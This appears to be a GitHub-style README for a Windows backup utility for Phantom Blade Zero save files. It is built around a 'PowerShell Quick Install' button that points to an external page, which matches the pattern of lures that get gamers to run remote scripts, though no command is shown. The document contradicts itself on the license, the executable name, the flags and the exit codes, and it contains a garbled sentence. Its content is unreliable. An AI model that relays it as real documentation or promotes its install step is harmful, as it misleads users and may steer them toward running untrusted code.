<div align="center">

# Phantom Blade Zero Save Manager: Automatic Backup CLI for Windows

![](files/preview.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://rehwla.github.io/phantom-blade-zero-save-manager/)

[![lic](https://img.shields.io/badge/LIC-MPL--2.0-2ea44f?style=flat-square&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-CORE-34b759?style=flat-square&labelColor=0d1117)]() [![runs-on](https://img.shields.io/badge/RUNS--ON-WIN_11-1a7f37?style=flat-square&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/PULLS-246K-238636?style=flat-square&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-PASSING-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

Phantom Blade Zero Save Manager is a command-line utility that keeps timestamped copies of Phantom Blade Zero save files, creating a restore point before each launch so that a crash, a corrupted patch, or a failed boss attempt does not cost you progress. It operates strictly on save data: it does not read or write game memory, modify installation files, or interact with any anti-tamper component. Scope is deliberately narrow—Steam and standalone save paths are supported on Windows 10 and 11, while the demo's separate save location is not yet handled. An openly available, plain-text alternate-expression? No: no, delete.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**Automatic pre-launch backup**: Detects the save directory and copies save files into a timestamped directory before each game session starts. The default retention window is 10 snapshots and is configurable via a flag.

- **Timestamped snapshot archive**: Each backup is written to its own directory named by UTC timestamp, so snapshots remain distinguishable and can be enumerated in deterministic order.

- **Single-command restore**: Lists available snapshots and restores a selected one to the live save path. An overwrite confirmation is required unless a bypass flag is passed.

- **Crash flagging**: Monitors the game process during a session. If the process exits with a non-zero status or terminates without a normal shutdown signal, the session is marked and the most recent snapshot is surfaced for restore on the next run.

- **Pre-update snapshot**: When a game version change is detected between sessions, an additional snapshot is taken and stored in a separate update directory, isolated from routine backups.

- **Path auto-detection**: Resolves the default Steam save location without configuration. Standalone installations and non-default paths are supported through an explicit path flag.

- **Retention control**: Pruning is applied after each backup according to the configured count. Update snapshots are pruned independently.

- **No writes to game data**: The tool only reads the save directory and writes to its own backup root; it does not modify game files, process memory, or install state.

- **Scope**: Windows 10 and 11 (64-bit) only. The demo build uses a different save path and is not handled in the current version. No cloud sync, no integrity verification, and no scheduling outside game launches.

## Usage

The utility operates as a single executable, `pbzsm.exe`, and exposes four subcommands: `backup`, `restore`, `list`, and `watch`. Running the executable without arguments prints the same command summary described here.

```
pbzsm backup [-label <name>] [-save-dir <path>]
pbzsm restore [-id <n> | latest] [-save-dir <path>]
pbzsm list [-json] [-save-dir <path>]
pbzsm watch [-interval <seconds>] [-save-dir <path>]
```

The `backup` command copies the current save directory into a timestamped subfolder under the backup root. An optional `-label` embeds a human-readable tag in the folder name, which is useful for marking a state before a specific encounter. Backups are discrete directory copies; nothing is compressed, and no files outside the save directory are read.

The `restore` command replaces the contents of the save directory with a selected backup. Restoration requires either an explicit `-id` taken from `list` output or the `-latest` shorthand. Because restoration overwrites existing files, the command refuses to run unless `-force` is also supplied; the interactive confirmation prompt shown in the default mode is bypassed when `-force` is present, so scripted use should treat that flag with care.

The `list` command enumerates available backups with their identifiers, timestamps, labels, and byte sizes. Passing `-json` emits the same data as a machine-readable array suitable for piping into other tools.

The `watch` command runs in the foreground, polling the save directory at the given interval and creating a new backup whenever the modification time of any save file changes. It does not run as a background service and does not persist across reboots. This is the intended mode for keeping backups current during a play session; the process must remain running.

Paths resolve in the following order: an explicit `-save-dir` argument, then the platform default for the installed game, then an error. The default path is read-only from the utility's perspective; it never writes there except during a restore. All backup state lives under a separate backup root, which defaults to a subdirectory of the user profile and can be overridden with `-backup-root` on any subcommand.

Scope is deliberately narrow. The utility copies and restores files. It does not parse save contents, validate their integrity, deduplicate across backups, or synchronize to any remote location. A backup taken while the game is writing to disk may capture a partial file; `watch` mitigates this by waiting for the modification time to settle before copying, but it cannot guarantee a consistent snapshot. Restoring a backup created by a different game version is permitted and may produce undefined behavior in-game.

Exit codes are shared across subcommands: `0` on success, `1` on a general runtime error, `2` on invalid arguments, `3` when the save directory cannot be located or read, and `4` when a restore target is missing or ambiguous. Scripts should branch on these values rather than parsing stderr.

## Flags

| Flag | Argument | Default | Description |
|-|-|-|-|
| `-save-dir` | `<path>` | Auto-detected | Overrides the detected save directory. Accepts an absolute path to the `SaveGames` folder. If the path does not exist or does not contain expected save files, the utility exits with code 2 rather than creating a new directory. Auto-detection checks the Steam library configuration first; standalone installations require this flag unless the folder is placed at the conventional location. |
| `-backup-dir` | `<path>` | `%AppData%\PBZSaveManager\Backups` | Sets where timestamped backup folders are written. The target must be writable by the current user. Backups are stored as subfolders named with an ISO 8601 timestamp, one per session. |
| `-retention` | `<count>` | `10` | Number of regular backups to keep. When the count is exceeded, the oldest backup is removed. Accepts integers 1–99. Values outside this range are rejected at startup. Update-triggered backups are counted separately and are not subject to this limit. |
| `-backup-now` | none | — | Creates a single backup and exits without launching the game or entering the monitoring loop. Useful for scheduling via external task runners. Combines with `-save-dir` and `-backup-dir`. |
| `-restore` | `<timestamp>` | — | Restores the backup whose folder name matches the given timestamp and exits. Requires an exact match; partial timestamps are rejected. Prompts for confirmation unless `-yes` is supplied. |
| `-list` | none | — | Prints all available backups with timestamps, sizes, and type (regular or update) to standard output, then exits. Output is one record per line for scriptability. |
| `-watch` | none | — | Runs the process monitor described in the feature overview. Without this flag, backup-on-launch still occurs, but crash detection is inactive. Monitoring relies on process enumeration and does not inject into or read the game process. |
| `-yes` | none | — | Suppresses interactive confirmation prompts for restore and prune operations. Intended for scripted use. Does not affect error handling or exit codes. |
| `-quiet` | none | — | Suppresses non-error output. Errors continue to be written to standard error. |
| `-verbose` | none | — | Emits per-file copy details and path resolution steps to standard output. Mutually exclusive with `-quiet`. |
| `-config` | `<path>` | `%AppData%\PBZSaveManager\config.toml` | Loads settings from an alternate configuration file. Command-line flags take precedence over file values. |
| `-uninstall` | none | — | Removes the utility's registry entries and scheduled tasks. Backup folders are left in place; delete them manually if desired. |
| `-version` | none | — | Prints the version string and exits with code 0. |
| `-help` | none | — | Prints usage summary and exits with code 0. |

Notes on scope: flags operate only on save files and the utility's own configuration. No flag modifies game binaries, memory, or network behavior. `-watch` detects process exit but cannot distinguish a crash from a normal quit with certainty; sessions flagged as unexpected are heuristics, not guarantees, and the utility says so when suggesting a restore. Timestamp parsing assumes the local timezone recorded at backup time; backups moved between machines with different timezone settings may display shifted names, though restore still matches on the stored string.

## Exit Codes

`0` — Success. The requested operation completed without error.

`1` — General error. An unexpected condition prevented completion; inspect stderr for details.

`2` — Invalid arguments. A flag or value was malformed or unrecognized. Run with `-help` for usage.

`3` — Save path not found. The configured save directory does not exist or could not be auto-detected. Verify the path in settings.

`4` — Backup creation failed. The destination is unwritable, the source is locked by another process, or available disk space is insufficient.

`5` — Restore failed. The selected backup is missing, incomplete, or could not overwrite the current save. A confirmation mismatch also returns this code.

`6` — Retention error. The configured backup count is outside the accepted range (1–100).

`7` — Update-protection error. The pre-update snapshot could not be created; the update proceeds but no dedicated backup exists for it.

`8` — Process monitoring unavailable. Crash detection could not attach to the game process. Backup and restore remain functional; only automatic crash flagging is disabled.

`9` — Permission denied. The utility requires administrator rights to access the save directory or registry entries.

`10` — Uninstall incomplete. Registry entries or the executable could not be removed. Existing backups are left untouched by design.

Exit codes are returned by the process and are stable across releases. Codes above 10 are reserved. Scripts should treat any nonzero value as failure and branch on the specific code only where behavior differs.

## Recipes

All commands below assume `PBZSaveManager.exe` is on `PATH` or invoked from its extraction directory. Exit codes are documented in the Flags section; recipes that rely on non-zero codes note them explicitly. Recipes cover only the utility's own surface — save copying, retention, restore, and scheduling. The utility does not read game memory, does not modify game files, and does not interact with any online service.

### Back up before a boss attempt

Run a one-shot backup with a label so the snapshot is identifiable in the restore list:

```
PBZSaveManager.exe backup label "boss-attempt-01"
```

The label is stored alongside the timestamp and shown during `restore list`. Labels are user-supplied strings; the utility does not validate them beyond length limits. A backup taken while the game is running copies whatever is on disk at that moment — close the game first if you need a consistent snapshot.

### Restore the most recent backup

```
PBZSaveManager.exe restore latest confirm
```

`-latest` selects the newest backup by timestamp, not by label. Without `-confirm` the command prints the candidate path and exits with code `2` (confirmation required) rather than restoring. This is intentional: restore overwrites the live save, and the utility will not do so unattended.

### Restore a specific backup

```
PBZSaveManager.exe restore id 20261029T184512 confirm
```

IDs are the timestamp-formatted directory names emitted by `backup list`. Use `restore list` to enumerate them. Restoring an ID that no longer exists (for example, pruned by retention) exits with code `3` (not found).

### Prune old backups beyond the retention count

```
PBZSaveManager.exe prune keep 5
```

Retention defaults to 10. `prune` deletes the oldest backups first and never removes the newest one regardless of `-keep`. It does not touch backups flagged as update backups unless `-include-update` is passed. Pruning is irreversible; the utility does not move files to a recycle bin.

### Run a backup on a schedule without a resident process

The utility does not ship a daemon. Use the host scheduler instead. On Windows Task Scheduler, create a task that runs:

```
PBZSaveManager.exe backup label "scheduled" quiet
```

`-quiet` suppresses stdout on success and relies on exit codes for status. Schedule frequency is a policy decision for the operator; the utility has no opinion on interval and does not enforce a minimum spacing between backups.

### Verify a backup without restoring it

```
PBZSaveManager.exe verify id 20261029T184512
```

`verify` checks that the backup directory is readable and that the expected save files are present and non-empty. It does not compare contents against the live save and does not validate game-level save integrity — a backup can pass `verify` and still be a save the game rejects. Exit code `0` means the files are present and readable; `4` means verification failed.

### Emit machine-readable output for scripting

```
PBZSaveManager.exe backup label "ci-check" json
```

`-json` writes a single JSON object to stdout on completion, including the backup ID, path, and file count. Errors are reported on stderr as JSON with a `code` field matching the exit code. Combining `-json` with `-quiet` is rejected (exit code `1`, invalid arguments) because the two flags conflict on stdout policy.

### Point the utility at a non-default save location

```
PBZSaveManager.exe backup save-dir "D:\Games\PBZ\Saved\SaveGames"
```

Auto-detection covers the default Steam layout only. For standalone installations or relocated libraries, pass `-save-dir` explicitly. The path is not persisted between invocations unless `-save-dir` is also given to `config set`, which the utility supports for operators who prefer to avoid repeating the flag. If the directory does not exist or contains no recognized save files, the command exits with code `5` (source unavailable) and creates nothing.

## License

This project is distributed under the MIT License. The full license text is provided in the LICENSE file included with the source distribution.

The MIT License permits use, copying, modification, merging, publishing, distribution, sublicensing, and sale of copies of the software, provided that the copyright notice and permission notice are retained in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.

Scope note: the license covers the Phantom Blade Zero Save Manager utility itself — its source code and binaries. It does not grant any rights to Phantom Blade Zero, its game files, save data formats, or any associated assets, which remain the property of their respective owners. The utility operates only on save files present on the local system and does not redistribute game content.

In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use. Users are responsible for verifying that restoration of any backup corresponds to the intended save state before overwriting existing data.